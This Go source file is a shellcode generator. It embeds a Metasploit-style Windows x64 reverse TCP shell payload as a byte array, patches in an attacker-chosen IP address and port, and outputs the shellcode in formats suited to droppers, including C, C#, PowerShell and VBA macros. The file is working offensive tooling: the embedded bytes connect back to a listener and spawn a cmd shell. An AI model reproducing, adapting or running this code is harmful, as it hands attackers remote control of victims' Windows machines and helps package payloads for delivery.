package main

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"strconv"
	"strings"
)

var (
	offsetPort = 232
	offsetIPv4 = 234
	host       string
	port       int
	format     string
)

func replacePortInBuffer(buf []byte, port int) error {
	if port < 0 || port > 65535 {
		return fmt.Errorf("port must be in the range 0-65535")
	}

	if offsetPort < 0 || offsetPort+1 >= len(buf) {
		return fmt.Errorf("port offset is out of buffer bounds")
	}

	portHex := make([]byte, 2)
	binary.BigEndian.PutUint16(portHex, uint16(port))

	buf[offsetPort] = portHex[0]
	buf[offsetPort+1] = portHex[1]

	return nil
}

func replaceIPv4InBuffer(buf []byte, ip [4]byte) error {
	if offsetIPv4 < 0 || offsetIPv4+3 >= len(buf) {
		return fmt.Errorf("IPv4 offset is out of buffer bounds")
	}

	for i := 0; i < 4; i++ {
		buf[offsetIPv4+i] = ip[i]
	}

	return nil
}

func parseIPv4(ipStr string) ([4]byte, error) {
	parts := strings.Split(ipStr, ".")
	if len(parts) != 4 {
		return [4]byte{}, fmt.Errorf("invalid IPv4 address: %s", ipStr)
	}

	var ip [4]byte
	for i, part := range parts {
		octet, err := strconv.Atoi(part)
		if err != nil || octet < 0 || octet > 255 {
			return [4]byte{}, fmt.Errorf("invalid octet in IPv4 address: %s", part)
		}
		ip[i] = byte(octet)
	}

	return ip, nil
}

func formatC(buf []byte) string {
	var sb strings.Builder
	sb.WriteString("unsigned char buf[] = {")
	for _, b := range buf {
		sb.WriteString(fmt.Sprintf("0x%02x, ", b))
	}
	sb.WriteString("};")
	return sb.String()
}

func formatRust(buf []byte) string {
	var sb strings.Builder
	sb.WriteString("let buf: [u8; ")
	sb.WriteString(fmt.Sprintf("%d", len(buf)))
	sb.WriteString("] = [")
	for _, b := range buf {
		sb.WriteString(fmt.Sprintf("0x%02x, ", b))
	}
	sb.WriteString("];")
	return sb.String()
}

func formatCSharp(buf []byte) string {
	var sb strings.Builder
	sb.WriteString("byte[] buf = new byte[] {")
	for _, b := range buf {
		sb.WriteString(fmt.Sprintf("0x%02x, ", b))
	}
	sb.WriteString("};")
	return sb.String()
}

func formatVBA(buf []byte) string {
	var sb strings.Builder
	sb.WriteString("Dim buf() As Byte\nbuf = Array(")
	for _, b := range buf {
		sb.WriteString(fmt.Sprintf("&H%02x, ", b))
	}
	sb.WriteString(")")
	return sb.String()
}

func formatPowerShell(buf []byte) string {
	var sb strings.Builder
	sb.WriteString("$buf = @(")
	for _, b := range buf {
		sb.WriteString(fmt.Sprintf("0x%02x, ", b))
	}
	sb.WriteString(")")
	return sb.String()
}

func main() {
	flag.StringVar(&host, "l", "127.0.0.1", "LHOST IP address")
	flag.IntVar(&port, "p", 4444, "Port number (0-65535)")
	flag.StringVar(&format, "f", "raw", `Formats: {raw, hex, base64, c, rust, csharp, psh, vba}`)
	flag.Parse()

	// msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f go
	buf := make([]byte, 460)
	copy(buf, []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00,
		0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
		0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20,
		0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
		0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1,
		0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b,
		0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00,
		0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b,
		0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
		0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9,
		0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38,
		0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75,
		0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b,
		0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
		0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41,
		0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff,
		0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff,
		0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x00, 0x00,
		0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00,
		0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0x7f, 0x00, 0x00,
		0x01, 0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c,
		0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68, 0x01, 0x01, 0x00,
		0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x50, 0x50,
		0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc2,
		0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf, 0xe0,
		0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89, 0xe2,
		0x48, 0x89, 0xf9, 0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x48,
		0x81, 0xc4, 0x40, 0x02, 0x00, 0x00, 0x49, 0xb8, 0x63, 0x6d, 0x64, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x41, 0x50, 0x41, 0x50, 0x48, 0x89, 0xe2, 0x57,
		0x57, 0x57, 0x4d, 0x31, 0xc0, 0x6a, 0x0d, 0x59, 0x41, 0x50, 0xe2, 0xfc,
		0x66, 0xc7, 0x44, 0x24, 0x54, 0x01, 0x01, 0x48, 0x8d, 0x44, 0x24, 0x18,
		0xc6, 0x00, 0x68, 0x48, 0x89, 0xe6, 0x56, 0x50, 0x41, 0x50, 0x41, 0x50,
		0x41, 0x50, 0x49, 0xff, 0xc0, 0x41, 0x50, 0x49, 0xff, 0xc8, 0x4d, 0x89,
		0xc1, 0x4c, 0x89, 0xc1, 0x41, 0xba, 0x79, 0xcc, 0x3f, 0x86, 0xff, 0xd5,
		0x48, 0x31, 0xd2, 0x48, 0xff, 0xca, 0x8b, 0x0e, 0x41, 0xba, 0x08, 0x87,
		0x1d, 0x60, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6,
		0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c,
		0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
		0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5})

	err := replacePortInBuffer(buf, port)
	if err != nil {
		fmt.Println("Error replacing port in buffer:", err)
		return
	}

	ip, err := parseIPv4(host)
	if err != nil {
		fmt.Println("Error converting IP address:", err)
		return
	}

	err = replaceIPv4InBuffer(buf, ip)
	if err != nil {
		fmt.Println("Error replacing IP address in buffer:", err)
		return
	}

	switch format {
	case "hex":
		fmt.Print(hex.EncodeToString(buf))
	case "base64":
		fmt.Print(base64.StdEncoding.EncodeToString(buf))
	case "c":
		fmt.Print(formatC(buf))
	case "rust":
		fmt.Print(formatRust(buf))
	case "csharp":
		fmt.Print(formatCSharp(buf))
	case "psh":
		fmt.Print(formatPowerShell(buf))
	case "vba":
		fmt.Print(formatVBA(buf))
	case "raw":
		fmt.Print(string(buf))
	default:
		fmt.Print(string(buf))
	}
}
